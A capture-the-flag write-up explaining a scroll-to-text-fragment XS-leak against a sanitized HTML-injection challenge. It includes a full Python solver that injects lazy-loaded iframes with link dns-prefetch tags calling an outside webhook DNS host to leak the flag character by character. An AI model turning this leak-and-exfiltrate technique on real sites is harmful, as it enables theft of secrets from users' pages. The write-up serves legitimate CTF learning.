---
title: "go touch grass xsleaks Backoor CTF"
date: 2025-01-19T21:26:29+05:30
draft: false
---

**tl;dr**

* Scroll to text fragment XSleak to detect flag  
* Exfiltrate characters using link tag dns-prefetch 
* leak flag char by char
<!--more-->

## 🔎 Challenge Overview

The challenge gives a very straightforward HTML injection on the `note` parameter.

```python
template = """<!DOCTYPE html>
<html>
<head>

</head>
<body>
    <div class="head"></div>
    {% if flag %}
        <div class="flag"><h1>{{ flag }}</h1></div>
    {% endif %}
    {% if note %}
        <div class="note">{{ note | safe}}</div>
    {% endif %}
    <script nonce="{{ nonce }}">
        Array.from(document.getElementsByClassName('flag')).forEach(function(element) {
            let text = element.innerText;
            element.innerHTML = '';
            for (let i = 0; i < text.length; i++) {
                let charElem = document.createElement('span');
                charElem.innerText = text[i];
                element.appendChild(charElem);
            }
        });
    </script>
</body>
</html>
"""
```

Examining the code, we can see that our input in the `note` parameter is being sanitized by a server-side HTML sanitizer, so we can't get a quick XSS and steal the flag sadly.

Looking at the sanitizer more closely to see the allowed tags:

```python
ALLOWED_TAGS = {
    'a', 'b', 'blockquote', 'br', 'code', 'div', 'em', 
    'h1', 'h2', 'h3', 'i', 'iframe', 'img', 'li', 'link', 
    'ol', 'p', 'pre', 'span', 'strong', 'ul'
}
ALLOWED_ATTRIBUTES = {
    'a': {'href', 'target'},
    'link': {'rel', 'href', 'type', 'as'}, 
    '*': {
        'style','src', 'width', 'height', 'alt', 'title',
        'lang', 'dir', 'loading', 'role', 'aria-label'
    }
}
```

We can see that `iframe` is allowed. The flag is on the webpage itself with each character inside a `span` tag, and below that is our HTML injection.

## 🥷 Attack plan

So it seems like a scroll-to-text-fragment XS-leak could be done to leak the flag.

Basically, if we give a `note={lots of <br>}flag{a#:~:text=flag{a`

- If the flag actually starts with `flag{a`, it doesn’t scroll down  
- But if it does **not** start with `flag{a`, it will scroll down to our injected `flag{a` beneath all the `<br>`s, and we have to detect this scroll.

The commonly used way to detect this scroll is by using lazy loading. We can use lazy-loading images or iframes—so when the iframe comes into the viewport, only then will the network request to load it be made. We can detect if the scroll happened or not using this.

Since our sanitizer does allow iframes, we can use it. But there is another issue: the CSP.

```python
response.headers['Content-Security-Policy'] = (
        f"default-src 'none'; script-src 'nonce-{nonce}'; style-src 'none'; "
        "base-uri 'none'; frame-ancestors 'self'; frame-src 'self'; object-src 'none'; "
    )
```

Iframe src is `self`, so we can’t point it to our webhook to detect whether the lazy loading happened.

Another way we could have detected this is by using a `<details>` element with our target text inside. If STTF hits text inside a `<details>` element, it will expand and open it. Then inside the details tag, we would have:

```
<object data=/x><object data=about:blank></object></object>
```

So when STTF hits and the details tag opens, there would be a new window reference and we could use window counting to leak whether the scroll happened using `window.length()`.

But here, we can’t use this as both the `details` tag and `object` tags are not allowed by the sanitizer.

However, we can still use DNS-prefetch requests using a `link` tag to send DNS requests to our webhook, but `link` tags don’t have a lazy-loading attribute.

So we would have to use the same HTML injection inside an iframe with lazy loading, and then inside that, using the HTML injection on the same webpage, use the `link` tag:

```
<iframe loading="lazy" src="/?note=<link rel='dns-prefetch' href='http://your-webhook'>"></iframe>
```

Using this, we can detect if the scroll happened or not.

## 🚀 Final Payloads

Here is the solver script:

```python
import requests
import base64
from urllib.parse import urlencode, quote
import time
import string
import logging
import sys

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")

CHALLENGE_URL = "http://34.10.220.48:6005"
BOT_URL = f"{CHALLENGE_URL}/bot"
WEBHOOK_ID = "79d97e8c-a722-4b12-beb1-ddc61d35d0e8"
DNS_BASE = f"{WEBHOOK_ID}.dnshook.site"
WEBHOOK_API = f"https://webhook.site/token/{WEBHOOK_ID}/requests?sorting=newest"

CHARSET = string.ascii_lowercase + string.digits + "_-!{}"
KNOWN_FLAG = "fla"
SPACER = "<iframe height='10000'></iframe>"

RATE_LIMIT_DELAY = 12 

def get_logs():
    try:
        r = requests.get(WEBHOOK_API)
        if r.status_code == 200:
            data = r.json().get('data', [])
            results = set()

            for log in data:
                if log.get('type') == 'dns':
                    hostname = log.get('hostname', '')
                    if DNS_BASE in hostname:
                        prefix = hostname.split('.')[0]
                        results.add(prefix)
            return results
        return set()
    except Exception as e:
        logging.error(f"API Exception: {e}")
        return set()

def generate_iframe(current):
    current_flag = KNOWN_FLAG + current
    trap_host = f"{current_flag}.{DNS_BASE}"
    trap_content = f"<link rel='dns-prefetch' href='http://{trap_host}'>"
    trap_enc = quote(trap_content)
    
    sensor_html = (
        f'{SPACER}'
        f'<iframe loading="lazy" src="/?note={trap_enc}"></iframe>'
        f'<h1>d0wn</h1>'
    )
    return f"{sensor_html}#:~:text={current_flag}&text=d0wn"

def encode_payload(html):
    encoded_note = base64.b64encode(html.encode('utf-8')).decode('utf-8')
    query_params = {'note': encoded_note}
    encoded_string = urlencode(query_params)
    return encoded_string

def send_to_bot(payload):
    target = f"{BOT_URL}?{payload}"
    while True:
        try:
            r = requests.get(target, timeout=15)
            if r.status_code == 202:
                logging.info(f"Payload delivered successfully to {target}")
                return True
            elif r.status_code == 500:
                logging.warning("Received 500 Error (Rate Limit). Sleeping 60s...")
                time.sleep(60)
                continue
            else:
                logging.error(f"Bot returned unexpected status: {r.status_code}")
                return False
        except Exception as e:
            logging.error(f"Request failed: {e}")

def main():
    global KNOWN_FLAG
    logging.info(f"Starting Negative Match Attack on {CHALLENGE_URL}")
    logging.info(f"Current Known Flag: {KNOWN_FLAG}")

    while True:
        found_char = False
        chars = list(CHARSET)
        batch_size = 5
        
        for i in range(0, len(chars), batch_size):
            batch = chars[i:i+batch_size]
            batch_candidates = {} 
            
            logging.info(f"Processing Batch: {batch}")

            for char in batch:
                candidate = KNOWN_FLAG + char
                batch_candidates[candidate] = char
                
                logging.info(f"Testing Character: '{char}' | Candidate ID: {candidate}")

                iframe_html = generate_iframe(char)
                payload = encode_payload(iframe_html)
                
                send_to_bot(payload)
                time.sleep(RATE_LIMIT_DELAY)

            logging.info("Batch delivered. Verifying logs...")
            
            detected_hosts = get_logs()
            logging.info(f"All Detected DNS Hosts: {detected_hosts}")
            
            missing_candidates = []
            for candidate in batch_candidates:
                if candidate not in detected_hosts:
                    missing_candidates.append(candidate)
                else:
                    logging.info(f"Candidate '{candidate}' triggered DNS (Negative Match: Rejected)")

            logging.info(f"Missing Candidates (Potential Matches): {missing_candidates}")

            if len(missing_candidates) == 1:
                confirmed_candidate = missing_candidates[0]
                found_char = batch_candidates[confirmed_candidate]
                
                KNOWN_FLAG += found_char
                logging.info(f"CONFIRMED MATCH: '{found_char}' did not trigger DNS.")
                logging.info(f"UPDATED FLAG: {KNOWN_FLAG}")
                found_char = True
                break
            elif len(missing_candidates) > 1:
                logging.warning(f"Ambiguous result. Multiple candidates missing: {missing_candidates}. Retrying...")
            
        if not found_char:
            logging.info("Charset exhausted. No new character found. Exiting.")
            break
        
        if found_char: 
            found_char = False 
            continue

if __name__ == "__main__":
    main()

```


